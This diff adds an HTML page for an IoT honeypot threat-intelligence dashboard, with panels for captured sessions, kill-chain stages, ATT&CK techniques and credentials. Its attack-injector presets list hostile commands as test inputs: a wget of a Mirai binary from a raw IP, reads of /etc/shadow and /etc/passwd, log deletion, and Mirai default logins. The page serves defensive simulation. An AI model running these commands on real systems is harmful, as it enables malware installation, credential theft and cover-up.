@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Winnie-SOC | Distributed IoT Honeypot Threat Intelligence</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Ambient cyber background glow -->
+  <div class="cyber-grid-overlay"></div>
+
+  <!-- Top Navigation Header -->
+  <header class="soc-header">
+    <div class="header-brand">
+      <div class="brand-shield">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <path d="m9 12 2 2 4-4" stroke="#00ff9d"/>
+        </svg>
+      </div>
+      <div>
+        <h1 class="brand-title">WINNIE-SOC <span class="badge-version">v2.4-LIVE</span></h1>
+        <p class="brand-subtitle">Distributed ESP32 IoT Honeypot • Kill-Chain Analytics</p>
+      </div>
+    </div>
+
+    <!-- Node & Telemetry Status Bar -->
+    <div class="header-telemetry">
+      <div class="node-pill" id="espStatusPill">
+        <span class="status-dot dot-idle" id="espStatusDot"></span>
+        <span class="pill-label">ESP32 SENSOR:</span>
+        <span class="pill-value" id="espStatusText">WAITING FOR PACKETS</span>
+      </div>
+      <div class="node-pill">
+        <span class="pill-label">TCP INGESTION:</span>
+        <span class="pill-value text-cyan">PORT 5000</span>
+      </div>
+      <div class="node-pill">
+        <span class="status-dot dot-connected" id="wsStatusDot"></span>
+        <span class="pill-label">SOCKET:</span>
+        <span class="pill-value text-emerald" id="wsStatusText">CONNECTED</span>
+      </div>
+    </div>
+
+    <!-- Actions & Toolbar -->
+    <div class="header-actions">
+      <!-- Simulator Trigger -->
+      <div class="sim-dropdown-group">
+        <select id="simProfileSelect" class="cyber-select">
+          <option value="mirai_botnet">Mirai IoT Botnet Invasion</option>
+          <option value="credential_stuffing">Mass Credential Spraying</option>
+          <option value="recon_scanner">Automated Reconnaissance Scan</option>
+          <option value="shadow_exfiltration">Shadow Hash & Dropper Attack</option>
+          <option value="mozi_botnet">Mozi P2P Botnet Spreader</option>
+        </select>
+        <button id="btnLaunchSim" class="cyber-btn btn-primary">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+          Simulate Wave
+        </button>
+      </div>
+
+      <button id="btnSoundToggle" class="cyber-btn btn-secondary icon-btn" title="Toggle Audio Radar SFX">
+        <span id="soundIcon">🔇</span>
+      </button>
+
+      <button id="btnClearLogs" class="cyber-btn btn-secondary" title="Clear log cache">
+        Clear
+      </button>
+
+      <a href="/api/export" download="winnie_soc_audit.json" class="cyber-btn btn-outline">
+        Export Audit
+      </a>
+    </div>
+  </header>
+
+  <!-- Main Dashboard Container -->
+  <main class="soc-container">
+
+    <!-- KPI Summary Row (Panels 1 - 4 & Panel 17) -->
+    <section class="kpi-grid">
+      <!-- Panel 1 -->
+      <div class="kpi-card" id="kpiSessions">
+        <div class="kpi-header">
+          <span class="kpi-title">TOTAL SESSIONS</span>
+          <span class="kpi-tag text-cyan">METRIC-01</span>
+        </div>
+        <div class="kpi-value" id="statTotalSessions">0</div>
+        <div class="kpi-footer">Cumulative unique sessions</div>
+      </div>
+
+      <!-- Panel 2 -->
+      <div class="kpi-card" id="kpiCommands">
+        <div class="kpi-header">
+          <span class="kpi-title">TOTAL COMMANDS LOGGED</span>
+          <span class="kpi-tag text-cyan">METRIC-02</span>
+        </div>
+        <div class="kpi-value text-cyan" id="statTotalCommands">0</div>
+        <div class="kpi-footer">Shell commands & logins captured</div>
+      </div>
+
+      <!-- Panel 3 -->
+      <div class="kpi-card" id="kpiActive">
+        <div class="kpi-header">
+          <span class="kpi-title">ACTIVE ATTACKERS</span>
+          <span class="kpi-tag text-emerald">METRIC-03</span>
+        </div>
+        <div class="kpi-value text-emerald" id="statActiveSessions">0</div>
+        <div class="kpi-footer"><span class="pulse-ring"></span> Live active connections</div>
+      </div>
+
+      <!-- Panel 4 -->
+      <div class="kpi-card" id="kpiThreat">
+        <div class="kpi-header">
+          <span class="kpi-title">THREAT INDEX</span>
+          <span class="kpi-tag text-crimson">METRIC-04</span>
+        </div>
+        <div class="kpi-value threat-badge threat-low" id="statThreatIndex">LOW</div>
+        <div class="kpi-footer" id="statThreatDesc">Normal network baseline</div>
+      </div>
+
+      <!-- Panel 17: ESP32 Edge Device Health -->
+      <div class="kpi-card kpi-hw" id="kpiHw">
+        <div class="kpi-header">
+          <span class="kpi-title">ESP32 HARDWARE HEALTH</span>
+          <span class="kpi-tag text-amber">PANEL-17</span>
+        </div>
+        <div class="hw-metrics">
+          <div class="hw-item">
+            <span class="hw-key">Device:</span>
+            <span class="hw-val" id="hwDevice">ESP32 DevKit v1 (240MHz)</span>
+          </div>
+          <div class="hw-item">
+            <span class="hw-key">Est. Free Heap:</span>
+            <span class="hw-val text-emerald" id="hwHeapVal">Calculating...</span>
+          </div>
+          <div class="hw-item">
+            <span class="hw-key">TCP Packets Ingested:</span>
+            <span class="hw-val text-cyan" id="hwPacketsVal">0</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Interactive Live TCP Command Injector (Proves real socket communication) -->
+    <section class="injector-bar">
+      <div class="injector-header">
+        <span class="panel-title text-cyan">⚡ LIVE ATTACK INJECTOR (TRANSMIT OVER REAL TCP PORT 5000)</span>
+        <span class="panel-badge-pill text-emerald">REAL-TIME SOCKET</span>
+      </div>
+      <div class="injector-form">
+        <div class="injector-input-wrap">
+          <span class="injector-prefix">IP:</span>
+          <input type="text" id="injectIp" class="cyber-input" value="192.168.1.105" placeholder="Attacker IP" style="width: 140px;">
+        </div>
+        <div class="injector-input-wrap flex-grow">
+          <span class="injector-prefix">COMMAND:</span>
+          <input type="text" id="injectCmd" class="cyber-input" placeholder="e.g. cat /etc/passwd or LOGIN: root / 123456 or wget http://c2.sh">
+        </div>
+        <button id="btnInjectTcp" class="cyber-btn btn-primary">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+          Inject via TCP:5000
+        </button>
+      </div>
+      <div class="injector-presets">
+        <span class="sub-label">QUICK PAYLOADS:</span>
+        <button class="preset-tag" data-cmd="LOGIN: root / xc3511">🔑 Mirai Login (root/xc3511)</button>
+        <button class="preset-tag" data-cmd="LOGIN: admin / admin">🔑 Default Admin (admin/admin)</button>
+        <button class="preset-tag" data-cmd="uname -a">💻 uname -a</button>
+        <button class="preset-tag" data-cmd="id">👤 id</button>
+        <button class="preset-tag" data-cmd="cat /etc/passwd">📂 cat /etc/passwd</button>
+        <button class="preset-tag" data-cmd="cat /etc/shadow">🚨 cat /etc/shadow</button>
+        <button class="preset-tag" data-cmd="wget http://185.193.66.19/bins/mirai.arm7">⚡ wget mirai.arm7</button>
+        <button class="preset-tag" data-cmd="rm -rf /var/log/syslog">🛡️ rm /var/log</button>
+      </div>
+    </section>
+
+    <!-- Row 2: Live Terminal Console & Kill-Chain Funnel (Panels 5 & 6) -->
+    <section class="grid-2col">
+      <!-- Panel 5: Hacker Live Terminal Stream -->
+      <div class="panel-card terminal-card" id="panelTerminal">
+        <div class="panel-header">
+          <div class="header-with-icon">
+            <span class="terminal-dots">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+            </span>
+            <span class="panel-title">LIVE HACKER TERMINAL STREAM (SSH:22)</span>
+            <span class="panel-badge-pill text-cyan">PANEL-05</span>
+          </div>
+          <div class="panel-controls">
+            <label class="toggle-control">
+              <input type="checkbox" id="chkAutoscroll" checked>
+              <span>Autoscroll</span>
+            </label>
+            <button id="btnClearTerminal" class="small-btn">Clear</button>
+          </div>
+        </div>
+        <div class="terminal-body" id="terminalOutput">
+          <!-- Live lines inserted dynamically by JS -->
+        </div>
+      </div>
+
+      <!-- Panel 6: Cyber Kill-Chain Funnel -->
+      <div class="panel-card" id="panelKillChain">
+        <div class="panel-header">
+          <span class="panel-title">CYBER KILL-CHAIN ATTACK FUNNEL</span>
+          <span class="panel-badge-pill text-purple">PANEL-06</span>
+        </div>
+        <div class="killchain-container" id="killchainList">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+    </section>
+
+    <!-- Row 3: MITRE ATT&CK Matrix, Botnet Attribution & Velocity (Panels 7, 15, 12) -->
+    <section class="grid-3col">
+      <!-- Panel 7: MITRE ATT&CK Matrix Heatmap -->
+      <div class="panel-card col-span-2" id="panelMitre">
+        <div class="panel-header">
+          <span class="panel-title">MITRE ATT&CK® MATRIX HEATMAP (LIVE TECHNIQUE HITS)</span>
+          <span class="panel-badge-pill text-cyan">PANEL-07</span>
+        </div>
+        <div class="mitre-grid" id="mitreGrid">
+          <!-- Populated dynamically by JS with actual hit counts -->
+        </div>
+      </div>
+
+      <!-- Panel 15: Botnet Family Attribution & Panel 12 Velocity -->
+      <div class="panel-card flex-col" id="panelBotnets">
+        <div class="panel-header">
+          <span class="panel-title">BOTNET THREAT ATTRIBUTION</span>
+          <span class="panel-badge-pill text-amber">PANEL-15</span>
+        </div>
+        <div class="botnet-bars" id="botnetBars">
+          <!-- Populated dynamically by JS -->
+        </div>
+
+        <!-- Panel 12: Ingestion Velocity -->
+        <div class="velocity-box">
+          <div class="panel-header sub-header">
+            <span class="panel-title text-muted">EVENT VELOCITY (EVENTS/SEC)</span>
+            <span class="panel-badge-pill text-cyan" id="velocityRateText">0.0 eps</span>
+          </div>
+          <canvas id="velocityCanvas" width="300" height="75"></canvas>
+        </div>
+      </div>
+    </section>
+
+    <!-- Row 4: Credentials, Top Commands & Attacker Origin (Panels 8, 9, 10, 11) -->
+    <section class="grid-3col">
+      <!-- Panel 8 & 9: Targeted Credentials -->
+      <div class="panel-card" id="panelCreds">
+        <div class="panel-header">
+          <span class="panel-title">TARGETED CREDENTIALS</span>
+          <span class="panel-badge-pill text-cyan">PANELS-08/09</span>
+        </div>
+        <div class="creds-dual-list">
+          <div>
+            <div class="sub-label">TOP USERNAMES</div>
+            <div id="topUsersList" class="stat-bar-list"></div>
+          </div>
+          <div>
+            <div class="sub-label">TOP PASSWORDS</div>
+            <div id="topPasswordsList" class="stat-bar-list"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Panel 10: Top Executed Commands -->
+      <div class="panel-card" id="panelCommands">
+        <div class="panel-header">
+          <span class="panel-title">TOP EXECUTED COMMANDS</span>
+          <span class="panel-badge-pill text-cyan">PANEL-10</span>
+        </div>
+        <div id="topCommandsList" class="stat-bar-list">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+
+      <!-- Panel 11: Attacker IP Profiler -->
+      <div class="panel-card" id="panelIps">
+        <div class="panel-header">
+          <span class="panel-title">ATTACKER IP ORIGIN & THREAT PROFILER</span>
+          <span class="panel-badge-pill text-cyan">PANEL-11</span>
+        </div>
+        <div class="table-responsive">
+          <table class="soc-table">
+            <thead>
+              <tr>
+                <th>SOURCE IP</th>
+                <th>ORIGIN / ASN</th>
+                <th>EVENTS</th>
+                <th>THREAT SCORE</th>
+              </tr>
+            </thead>
+            <tbody id="topIpsBody">
+              <!-- Populated by JS -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- Row 5: Malware Staging URLs, Sensitive Files & Sessions (Panels 13, 14, 16, 18) -->
+    <section class="grid-2col">
+      <!-- Panel 13 & 14: Malware Droppers & Sensitive File Access -->
+      <div class="panel-card" id="panelIncidents">
+        <div class="panel-header">
+          <span class="panel-title">MALWARE DROPPERS & SENSITIVE FILE ACCESS</span>
+          <span class="panel-badge-pill text-crimson">PANELS-13/14</span>
+        </div>
+        <div class="incident-lists">
+          <div class="incident-subblock">
+            <div class="sub-label text-crimson">⚠️ INTERCEPTED WGET / CURL DROPPERS (PANEL-13)</div>
+            <div id="dropperUrlsList" class="incident-scroll">
+              <div class="empty-state">No malware drop URLs intercepted yet.</div>
+            </div>
+          </div>
+          <div class="incident-subblock">
+            <div class="sub-label text-amber">🚨 SENSITIVE FILE ACCESS ATTEMPTS (PANEL-14)</div>
+            <div id="sensitiveFilesList" class="incident-scroll">
+              <div class="empty-state">No sensitive system files accessed yet.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Panel 16 & 18: Attack Sessions Explorer with Keystroke Replay -->
+      <div class="panel-card" id="panelSessions">
+        <div class="panel-header">
+          <span class="panel-title">ATTACK SESSIONS (CLICK FOR KEYSTROKE REPLAY)</span>
+          <span class="panel-badge-pill text-emerald">PANELS-16/18</span>
+        </div>
+        <div class="table-responsive">
+          <table class="soc-table">
+            <thead>
+              <tr>
+                <th>SESSION</th>
+                <th>IP</th>
+                <th>COMMANDS</th>
+                <th>STAGE</th>
+                <th>ACTION</th>
+              </tr>
+            </thead>
+            <tbody id="sessionsTableBody">
+              <!-- Populated by JS -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- Row 6: Complete 47-Pattern Threat Taxonomy Explorer (Panel 19) -->
+    <section class="panel-card" id="panelTaxonomy">
+      <div class="panel-header">
+        <div class="header-with-icon">
+          <span class="panel-title">47-PATTERN ATTACK CLASSIFICATION TAXONOMY (REVIEW III COMPLIANCE)</span>
+          <span class="panel-badge-pill text-purple">TAXONOMY-47</span>
+        </div>
+        <div class="panel-controls">
+          <input type="text" id="taxonomySearch" class="cyber-input" placeholder="Search pattern (e.g. Mirai, shadow, wget)...">
+        </div>
+      </div>
+      <div class="taxonomy-grid" id="taxonomyGrid">
+        <!-- Populated by JS -->
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Modal: Panel 18 Keystroke Replay Inspector -->
+  <div class="soc-modal" id="replayModal">
+    <div class="modal-backdrop" id="modalBackdrop"></div>
+    <div class="modal-content">
+      <div class="modal-header">
+        <div>
+          <h3 class="modal-title" id="modalSessionTitle">SESSION #001 REPLAY</h3>
+          <p class="modal-subtitle" id="modalSessionSubtitle">IP: 185.220.101.5 • Mirai Botnet</p>
+        </div>
+        <button class="modal-close" id="modalCloseBtn">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div class="replay-terminal" id="replayTerminal">
+          <!-- Step by step keystrokes rendered here -->
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="cyber-btn btn-secondary" id="modalCloseFooterBtn">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
